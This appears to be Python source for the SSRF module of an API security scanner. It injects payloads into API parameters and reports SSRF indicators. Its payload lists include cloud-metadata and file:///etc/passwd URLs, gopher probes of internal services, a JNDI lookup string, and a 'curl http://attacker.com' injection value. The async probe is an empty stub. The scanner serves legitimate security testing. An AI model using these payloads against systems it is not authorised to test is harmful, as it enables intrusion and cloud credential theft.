##################################
# APISCAN - API Security Scanner #
# Licensed under the MIT License #
# Author: Perry Mertens, 2025    #
##################################
from __future__ import annotations
import json
import random
import threading
import time
import socket
import sys
import base64
import html
import logging
import asyncio
import aiohttp
from urllib.parse import urlparse, quote_plus, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from tqdm import tqdm
from report_utils import ReportGenerator
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
Endpoint = Dict[str, Any]
Issue = Dict[str, Any]

class SSRFConfig:

    def __init__(self):
        self.timeout = 4
        self.max_concurrency = 10
        self.rps_limit = 8
        self.blind_threshold = 4.0
        self.verify_tls = False
        self.test_localhost = False
        self.excluded_parameters = ['token', 'auth', 'password', 'secret', 'key']
        self.response_body_limit = 2048
        self.encoding_types = ['default', 'double_url', 'utf8', 'base64', 'html']

def _headers_to_list(hdrs):
    if hasattr(hdrs, 'getlist'):
        return [(k, v) for k in hdrs for v in hdrs.getlist(k)]
    try:
        return list(hdrs.items())
    except Exception:
        return []

def _safe_body(resp: Optional[requests.Response], limit: int=2048) -> str:
    if not resp:
        return ''
    try:
        txt = resp.text or ''
        if txt:
            return txt[:limit]
    except Exception:
        pass
    try:
        return (resp.content or b'')[:limit].decode('utf-8', 'replace')
    except Exception:
        return ''

def _abs_url(base_url: str, rel: str) -> str:
    if rel.startswith(('http://', 'https://')):
        return rel
    return urljoin(base_url.rstrip('/') + '/', rel.lstrip('/'))

class SSRFAuditor:
    CONFIG = SSRFConfig()
    SAFE_FILE_PAYLOADS = ['file:///etc/passwd', 'file:///c:/windows/system32/drivers/etc/hosts']
    CLOUD_METADATA_PAYLOADS = ['http://169.254.169.254/', 'http://169.254.169.254/latest/meta-data/', 'http://169.254.169.254/latest/user-data/', 'http://metadata.google.internal/', 'http://metadata.google.internal/computeMetadata/v1/', 'http://100.100.100.200/latest/meta-data/', 'http://metadata.tencentyun.com/latest/meta-data/']
    LOOPBACK_PAYLOADS = ['http://localhost/', 'http://127.0.0.1/', 'http://[::1]/', 'http://0.0.0.0/', 'http://2130706433/', 'http://127.0.0.1.nip.io/']
    DNS_REBINDING_PAYLOADS = ['http://example.com#@evil.com/', 'http://example.com@evil.com/', 'http://127.0.0.1:80@evil.com/']
    OAST_PAYLOADS = ['http://burpcollaborator.net/', 'http://localtest.me/', 'http://customer.app.localhost.127.0.0.1.nip.io/']
    PROTOCOL_PAYLOADS = ['gopher://127.0.0.1:11211/_stats\r\nquit\r\n', 'dict://127.0.0.1:11211/stats', 'ldap://127.0.0.1:389/']
    PAYLOADS = SAFE_FILE_PAYLOADS + CLOUD_METADATA_PAYLOADS + LOOPBACK_PAYLOADS + DNS_REBINDING_PAYLOADS + OAST_PAYLOADS + PROTOCOL_PAYLOADS
    LANG_PAYLOADS = ['http://127.0.0.1/%0D%0AConnection:%20keep-alive', 'en;http://169.254.169.254', '../../../../etc/passwd', '${jndi:ldap://attacker.com}', 'en|curl http://attacker.com']

    def __init__(self, base_url: str, session: Optional[requests.Session]=None, *, concurrency: int=CONFIG.max_concurrency, rps: int=CONFIG.rps_limit, timeout: int=CONFIG.timeout, verify_tls: bool=CONFIG.verify_tls, show_progress: bool=True) -> None:
        if not base_url.startswith(('http://', 'https://')):
            raise ValueError('Base URL must start with http:// or https://')
        self.base_url = base_url.rstrip('/')
        self.sess = session or requests.Session()
        self.sess.verify = verify_tls
        self.concurrency = max(1, min(concurrency, self.CONFIG.max_concurrency))
        self.rps = max(1, rps)
        self.timeout = timeout
        self.show_progress = show_progress
        self._last_ts = 0.0
        self._lock = threading.Lock()
        self._issues: List[Issue] = []
        self._tested_payloads: set[Tuple[str, str]] = set()

    @staticmethod
    def endpoints_from_swagger(swagger_path: str | Path, *, default_base: str='') -> List[Endpoint]:
        try:
            p = Path(swagger_path)
            spec = json.loads(p.read_text(encoding='utf-8'))
            servers = spec.get('servers') or []
            base = (servers[0].get('url') if servers and isinstance(servers[0], dict) else '') or default_base
            out: List[Endpoint] = []
            for path, item in (spec.get('paths') or {}).items():
                if not isinstance(item, dict):
                    continue
                for method, meta in item.items():
                    if method.upper() not in {'GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'}:
                        continue
                    ep: Endpoint = {'method': method.upper(), 'path': path, 'url': _abs_url(base or default_base, path), 'parameters': []}
                    params = []
                    if isinstance(item.get('parameters'), list):
                        params.extend(item.get('parameters'))
                    if isinstance(meta, dict) and isinstance(meta.get('parameters'), list):
                        params.extend(meta.get('parameters'))
                    ep['parameters'] = params
                    out.append(ep)
            return out
        except Exception as e:
            logger.error(f'Error reading Swagger file: {e}')
            return []

    def _tw(self, msg: str) -> None:
        if self.show_progress:
            tqdm.write(msg)
        else:
            print(msg)

    def _pace(self) -> None:
        with self._lock:
            now = time.perf_counter()
            min_gap = 1.0 / float(self.rps)
            wait = max(0.0, self._last_ts + min_gap - now)
            if wait > 0:
                time.sleep(wait)
            self._last_ts = time.perf_counter()

    def _encode_payload(self, payload: str, encoding_type: str='default') -> str:
        if encoding_type == 'double_url':
            return quote_plus(quote_plus(payload))
        elif encoding_type == 'utf8':
            return payload.encode('utf-8').hex()
        elif encoding_type == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == 'html':
            return html.escape(payload)
        else:
            return quote_plus(payload)

    def test_endpoints(self, endpoints: List[Endpoint]) -> List[Issue]:
        self._issues.clear()
        iterator = tqdm(endpoints, desc='API8 SSRF endpoints', unit='endpoint') if self.show_progress else endpoints
        with ThreadPoolExecutor(max_workers=self.concurrency) as ex:
            futures = {ex.submit(self._scan_endpoint, ep): ep for ep in endpoints}
            for _ in tqdm(as_completed(futures), total=len(futures), desc='SSRF scans', unit='endpoint', leave=False) if self.show_progress else as_completed(futures):
                pass
        return self._issues

    async def test_endpoints_async(self, endpoints: List[Endpoint]) -> List[Issue]:
        self._issues.clear()
        async with aiohttp.ClientSession() as session:
            tasks = [self._scan_endpoint_async(session, ep) for ep in endpoints]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, Exception):
                    logger.error(f'Fout tijdens async scan: {result}')
        return self._issues

    def _scan_endpoint(self, ep: Endpoint) -> None:
        method = (ep.get('method') or 'GET').upper()
        path = ep.get('path') or ''
        base = ep.get('base') or self.base_url
        url_base = _abs_url(base, path)
        host = (urlparse(url_base).hostname or '').lower()
        if not self.CONFIG.test_localhost and host in {'127.0.0.1', 'localhost', '::1'}:
            self._tw(f'[ABORT] Localhost target ({host}) - skipping endpoint {method} {path}')
            return
        if self.show_progress:
            self._tw(f'-> Testing {method} {url_base}')
        swagger_params = {p.get('name') for p in ep.get('parameters') or [] if p.get('in') in {'query', 'header', 'path'}}
        common_params = {'url', 'endpoint', 'host', 'server', 'target', 'lang', 'language', 'locale', 'v', 'version', 'api'}
        all_params = sorted([x for x in swagger_params | common_params if x and x not in self.CONFIG.excluded_parameters])
        p_iter = tqdm(all_params, desc='params', unit='param', leave=False) if self.show_progress else all_params
        for param in p_iter:
            payloads = list(self.PAYLOADS)
            random.shuffle(payloads)
            for payload in payloads:
                for encoding in self.CONFIG.encoding_types:
                    encoded_payload = self._encode_payload(payload, encoding)
                    self._probe_params(ep, url_base, method, param, encoded_payload, encoding)
            if param in {'lang', 'language', 'locale', 'v', 'version'}:
                for payload in self.LANG_PAYLOADS:
                    for encoding in self.CONFIG.encoding_types:
                        encoded_payload = self._encode_payload(payload, encoding)
                        self._probe_params(ep, url_base, method, param, encoded_payload, encoding)

    async def _scan_endpoint_async(self, session: aiohttp.ClientSession, ep: Endpoint) -> None:
        method = (ep.get('method') or 'GET').upper()
        path = ep.get('path') or ''
        base = ep.get('base') or self.base_url
        url_base = _abs_url(base, path)
        host = (urlparse(url_base).hostname or '').lower()
        if not self.CONFIG.test_localhost and host in {'127.0.0.1', 'localhost', '::1'}:
            self._tw(f'[ABORT] Localhost target ({host}) - skipping endpoint {method} {path}')
            return
        if self.show_progress:
            self._tw(f'-> Testing {method} {url_base}')
        swagger_params = {p.get('name') for p in ep.get('parameters') or [] if p.get('in') in {'query', 'header', 'path'}}
        common_params = {'url', 'endpoint', 'host', 'server', 'target', 'lang', 'language', 'locale', 'v', 'version', 'api'}
        all_params = sorted([x for x in swagger_params | common_params if x and x not in self.CONFIG.excluded_parameters])
        for param in all_params:
            payloads = list(self.PAYLOADS)
            random.shuffle(payloads)
            for payload in payloads:
                for encoding in self.CONFIG.encoding_types:
                    encoded_payload = self._encode_payload(payload, encoding)
                    await self._probe_params_async(session, ep, url_base, method, param, encoded_payload, encoding)
            if param in {'lang', 'language', 'locale', 'v', 'version'}:
                for payload in self.LANG_PAYLOADS:
                    for encoding in self.CONFIG.encoding_types:
                        encoded_payload = self._encode_payload(payload, encoding)
                        await self._probe_params_async(session, ep, url_base, method, param, encoded_payload, encoding)

    def _probe_params(self, ep: Endpoint, base_url: str, method: str, param: str, payload: str, encoding: str='default') -> None:
        key = (param, payload)
        with self._lock:
            if key in self._tested_payloads:
                return
            self._tested_payloads.add(key)
        self._pace()
        loopback_hosts = {'localhost', '127.0.0.1', '::1'}
        if any((lp in payload for lp in loopback_hosts)):
            self._tw(f'[WARN] Payload targets localhost: {payload}')
        host = (urlparse(base_url).hostname or '').lower()
        if not self.CONFIG.test_localhost and host in loopback_hosts:
            self._tw(f'[SKIP] Base URL is localhost; skip param={param}')
            return
        qs_url = f'{base_url}?{param}={payload}'
        self._probe(ep, qs_url, method, payload=payload, param=param, encoding=encoding)
        if method in {'POST', 'PUT', 'PATCH'}:
            self._probe(ep, base_url, method, json_body={param: payload}, payload=payload, param=param, encoding=encoding)
        if method in {'POST', 'PUT', 'PATCH'}:
            self._probe(ep, base_url, method, data={param: payload}, payload=payload, param=param, encoding=encoding)
        self._probe(ep, base_url, method, headers={param: payload}, payload=payload, param=param, encoding=encoding)
        if f'{{{param}}}' in base_url:
            path_url = base_url.replace(f'{{{param}}}', payload)
            self._probe(ep, path_url, method, payload=payload, param=param, encoding=encoding)

    async def _probe_params_async(self, session: aiohttp.ClientSession, ep: Endpoint, base_url: str, method: str, param: str, payload: str, encoding: str='default') -> None:
        pass

    def _probe(self, ep: Endpoint, url: str, method: str, *, json_body: Optional[dict]=None, data: Optional[dict]=None, headers: Optional[dict]=None, payload: str, param: str, encoding: str='default') -> None:
        started = time.perf_counter()
        try:
            resp = self.sess.request(method=method, url=url, json=json_body, data=data, headers=headers or {}, timeout=self.timeout, allow_redirects=True, verify=self.sess.verify)
            latency = time.perf_counter() - started
        except requests.exceptions.SSLError as e:
            logger.warning(f'SSL error for {url}: {e}')
            return
        except socket.timeout:
            logger.warning(f'Timeout for {url}')
            return
        except Exception as e:
            logger.error(f'Unexpected error while testing {url}: {e}')
            return
        body_low = _safe_body(resp, self.CONFIG.response_body_limit).lower()
        if latency >= self.CONFIG.blind_threshold:
            self._record_issue(ep=ep, payload=payload, status=resp.status_code, latency=latency, note=f'Potential blind SSRF (latency {latency:.2f}s)', param=param, encoding=encoding, request_headers=_headers_to_list(getattr(getattr(resp, 'request', None), 'headers', {})), response_headers=_headers_to_list(resp.headers), response_body=_safe_body(resp, self.CONFIG.response_body_limit), request_cookies=self.sess.cookies.get_dict(), response_cookies=resp.cookies.get_dict())
            return
        indicators = ('169.254.169.254', 'metadata.google.internal', 'localhost', '127.0.0.1', '/etc/passwd', 'root:x:', 'internal server error', 'connection refused', 'forbidden', 'not allowed')
        if any((ind in body_low for ind in indicators)):
            self._record_issue(ep=ep, payload=payload, status=resp.status_code, latency=latency, note='Reflected SSRF indicators in response', param=param, encoding=encoding, request_headers=_headers_to_list(getattr(getattr(resp, 'request', None), 'headers', {})), response_headers=_headers_to_list(resp.headers), response_body=_safe_body(resp, self.CONFIG.response_body_limit), request_cookies=self.sess.cookies.get_dict(), response_cookies=resp.cookies.get_dict())

    def _calculate_confidence(self, latency: float, response_body: str) -> str:
        if 'root:x:' in response_body or '169.254.169.254' in response_body:
            return 'High'
        elif latency > self.CONFIG.blind_threshold:
            return 'Medium'
        return 'Low'

    def _record_issue(self, ep: Endpoint, payload: str, status: int, latency: float, note: str, param: Optional[str]=None, encoding: Optional[str]=None, request_headers: Optional[list]=None, response_headers: Optional[list]=None, response_body: Optional[str]=None, request_cookies: Optional[dict]=None, response_cookies: Optional[dict]=None) -> None:
        confidence = self._calculate_confidence(latency, response_body or '')
        issue = {'endpoint': f"{ep.get('method', 'GET')} {ep.get('path', '')}", 'parameter': param or 'N/A', 'payload': payload, 'encoding': encoding or 'default', 'status_code': status, 'latency': round(latency, 2), 'description': note, 'severity': 'High' if 'Reflected' in note else 'Medium', 'confidence': confidence, 'timestamp': datetime.utcnow().isoformat(), 'request_headers': request_headers or [], 'response_headers': response_headers or [], 'request_body': None, 'response_body': response_body or '', 'request_cookies': request_cookies or {}, 'response_cookies': response_cookies or {}, 'evidence': response_body[:500] if response_body else '', 'reproduction_steps': f"Send {ep.get('method', 'GET')} request to {ep.get('path', '')} with {param}={payload}"}
        with self._lock:
            key = (issue['endpoint'], issue['parameter'], issue['payload'], issue['description'])
            if not any(((i['endpoint'], i['parameter'], i['payload'], i['description']) == key for i in self._issues)):
                if self.show_progress:
                    tqdm.write(f"[!] SSRF finding: {issue['description']} at {issue['endpoint']} (param: {issue['parameter']}, confidence: {confidence})")
                self._issues.append(issue)

    def _filtered_findings(self) -> list[dict]:
        src = getattr(self, '_issues', getattr(self, 'issues', []))
        out, seen = ([], set())
        for i in src:
            key = (i.get('endpoint'), i.get('parameter'), i.get('payload'), i.get('description'), i.get('status_code'))
            if key in seen:
                continue
            seen.add(key)
            out.append(i)
        return out

    def generate_report(self, fmt: str='html') -> str:
        issues = self._filtered_findings()
        if not issues:
            issues = [{'endpoint': '-', 'description': 'No SSRF findings detected', 'severity': 'Info', 'status_code': 200, 'timestamp': datetime.utcnow().isoformat(), 'request_headers': [], 'response_headers': [], 'response_body': ''}]
        gen = ReportGenerator(issues, scanner='SSRF (API8)', base_url=self.base_url)
        return gen.generate_html() if fmt == 'html' else gen.generate_markdown()

    def save_report(self, path: str, fmt: str='html') -> None:
        issues = self._filtered_findings()
        ReportGenerator(issues, scanner='SSRF (API8)', base_url=self.base_url).save(path, fmt=fmt)
